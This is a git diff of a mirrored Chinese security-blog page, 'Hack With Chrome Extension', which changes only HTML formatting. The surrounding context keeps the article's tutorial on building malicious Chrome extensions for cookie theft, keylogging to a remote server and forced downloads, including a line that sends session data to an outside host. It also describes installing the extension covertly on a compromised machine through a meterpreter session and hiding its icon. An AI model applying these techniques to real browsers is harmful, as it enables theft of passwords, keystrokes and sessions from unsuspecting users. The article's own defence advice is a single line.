@@ -3,14 +3,14 @@
 			<head>
 			     <title>Hack With Chrome Extension - Evi1cg</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/14410">http://drops.wooyun.org/tips/14410</a></h1>
 				
       <p>
-        <h1>0x00 Introduction</h1>
+        </p><h1>0x00 Introduction</h1>
 
-<hr />
+<hr>
 
 <p>众所周知，Web应用变得越来越流行，生活，办公，娱乐等等很多都是通过Web，而浏览器是我们访问Web最常使用的工具之一。随着Web功能的强大，浏览器的功能也变得越来越强大。而此文，就是介绍一种通过Chrome插件进行攻击的姿势跟手法。</p>
 
@@ -22,11 +22,11 @@
 
 <h1>0x01 Write Chrome Extension</h1>
 
-<hr />
+<hr>
 
 <p>在知道怎么写插件之前，我们首先了解一下插件的文件结构，随便下载一个谷歌插件,将其重命名为zip后缀之后进行解压，解压后的文件目录如下：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/2016040510522856171110.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160405/2016040510522856171110.png" alt="Alt text"></p>
 
 <p>其中，manifest.json是主文件，来声明要写的插件的相关信息。可以把mainfest.json理解成插件的入口，即chrome需要通过manifest.json来理解你的插件要引用哪些文件 、 需要哪些权限 、 插件图标 等信息。而其他文件，就是能实现此插件功能的脚本文件以及插件图标等。</p>
 
@@ -80,19 +80,19 @@
 
 <p>创建以下文件：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/2016040510523543228210.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160405/2016040510523543228210.png" alt="Alt text"></p>
 
 <p>现在，所有的文件就全了，但是还没什么功能，尝试加载一下插件，浏览器URL栏输入 <code>chrome://extensions/</code> 选择加载已解压的扩展程序，之后选择文件所在的文件夹。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/2016040510524340432310.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160405/2016040510524340432310.png" alt="Alt text"></p>
 
 <p>然后插件就已经被加载上了：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/2016040510524866759410.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160405/2016040510524866759410.png" alt="Alt text"></p>
 
 <h1>0x02 How to Hack</h1>
 
-<hr />
+<hr>
 
 <p>插件已经可以被成功加载了，怎么使用它来进行攻击呢，我们开始编写。</p>
 
@@ -113,7 +113,7 @@ if(''==1){keep=new Image();keep.src='http://xss9.com/index.php?do=keepsession&am
 
 <p>保存文件，重新加载插件，访问任意网站，获取访问网站的cookie信息，如下图：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/201604051052556736554.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160405/201604051052556736554.png" alt="Alt text"></p>
 
 <h3>2、Keyloger</h3>
 
@@ -157,7 +157,7 @@ fclose($log);
 
 <p>加载插件以后，键盘记录启动，当用户在网页中进行键盘输入时，输入数据会发送到远程服务器。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/201604051053018531164.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160405/201604051053018531164.png" alt="Alt text"></p>
 
 <h3>3、ForceDownload</h3>
 
@@ -209,7 +209,7 @@ $(document).ready(function()
     });
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160405/201604051053051371274.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160405/201604051053051371274.png" alt="Alt text"></p>
 
 <blockquote>
   <p>修改payload可针对性获取某网站账号密码信息。</p>
@@ -219,13 +219,13 @@ $(document).ready(function()
 
 <h1>0x03 When to Use</h1>
 
-<hr />
+<hr>
 
 <p>或许小伙伴们会问，弄这个有什么用，我又不需要装这个插件抓自己的密码。当然，这个肯定不是用来搞自己的。渗透测试过程中，有没有碰到过看到管理员经常使用Chrome浏览器，而我们却没办法获取到其常用密码呢？（管理员并没有使用浏览器记住密码的功能）。这个时候，除了给系统装键盘记录器，我们还可以为其浏览器装我们编写的插件。而这个插件，就可以用来搜集各种敏感信息，而且，针对的是浏览器访问的所有网站！</p>
 
 <p>除此之外，我发现chrome是可以通过命令行来安装插件的，来设想一个场景，我们使用某个漏洞，或者社会工程学获取了小明的计算机控制权，现在已经有了一个meterpreter会话如下：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/201604051053136676783.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160405/201604051053136676783.png" alt="Alt text"></p>
 
 <p>执行如下命令：</p>
 
@@ -233,21 +233,21 @@ $(document).ready(function()
 meterpreter &gt; run post/windows/gather/enum_chrome
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160405/201604051053225760693.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160405/201604051053225760693.png" alt="Alt text"></p>
 
 <p>可以看到目标系统是安装了chrome浏览器的。</p>
 
 <p>上传插件目录demo到<code>e:\demo\</code> 目录，由于meterpreter的upload只能上传文件，不能上传文件夹，所以这里需要把demo文件夹打包压缩以后再上传，之后再通过目标系统的解压软件或者自己上传的unrar.exe进行解压，具体操作如下图:</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/2016040510532797214103.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160405/2016040510532797214103.png" alt="Alt text"></p>
 
 <p>使用如下命令寻找安装的解压软件：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/2016040510533183690114.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160405/2016040510533183690114.png" alt="Alt text"></p>
 
 <p>之后使用如下命令进行解压并删除压缩包，具体操作如下图：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/2016040510534428131132.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160405/2016040510534428131132.png" alt="Alt text"></p>
 
 <p>之后为chrome添加插件，使用如下命令：</p>
 
@@ -263,11 +263,11 @@ meterpreter &gt; run post/windows/gather/enum_chrome
 
 <p>缺点一，会有如下提示（过几秒会消失）。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/2016040510534428131132.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160405/2016040510534428131132.png" alt="Alt text"></p>
 
 <p>缺点二，有图标，有提示。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/2016040510534871491142.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160405/2016040510534871491142.png" alt="Alt text"></p>
 
 <p>一直在想办法解决以上问题，图标可以换成透明的或者常用的插件图片来解决，另外两个暂时还没解决，详细的chrome命令可以参考这里: <a href="http://peter.sh/experiments/chromium-command-line-switches/">chromium-command-line</a>，有小伙伴有了解决方案还请不吝赐教。当然也可以尝试写一个小程序来监控chrome，一旦chrome打开，则模拟点击事件点击取消按钮。</p>
 
@@ -277,25 +277,25 @@ meterpreter &gt; run post/windows/gather/enum_chrome
 
 <p>然后，我就控制小明的所有访问内容了，就像这个图一样：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160405/201604051052556736554.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160405/201604051052556736554.png" alt="Alt text"></p>
 
 <p>当然除了以上的利用方式，还可以通过发布一些插件让其含有攻击代码同样可以实现此功能。</p>
 
 <h1>0x04 How to Defend</h1>
 
-<hr />
+<hr>
 
 <p>对于不明来历的插件尽量不要安装，如果发现问题，请尽早修改自己各个账号密码。</p>
 
 <h1>0x05 Summarize</h1>
 
-<hr />
+<hr>
 
 <p>此文主要介绍在渗透测试过程中的一种思路，有兴趣的小伙伴可以继续测试其他浏览器的插件，这种方式虽然简单，但是效果还不错，你值得拥有。以上文件可以通过这里下载：<a href="https://github.com/Ridter/Pentest/tree/master/backdoor/Extension_Backdoor">Extension_Backdoor</a>。</p>
 
 <h1>0x06 Consult</h1>
 
-<hr />
+<hr>
 
 <ol>
 <li><a href="http://peter.sh/experiments/chromium-command-line-switches/#condition-21">http://peter.sh/experiments/chromium-command-line-switches/#condition-21</a></li>
@@ -304,7 +304,7 @@ meterpreter &gt; run post/windows/gather/enum_chrome
 <li><a href="http://www.cnblogs.com/walkingp/archive/2011/03/31/2001628.html">http://www.cnblogs.com/walkingp/archive/2011/03/31/2001628.html</a></li>
 </ol>
 
-<p><strong>本文由evi1cg原创并首发于乌云drops，转载请注明</strong></p>      </p>
+<p><strong>本文由evi1cg原创并首发于乌云drops，转载请注明</strong></p>      <p></p>
     
 			</body>
 		</html>
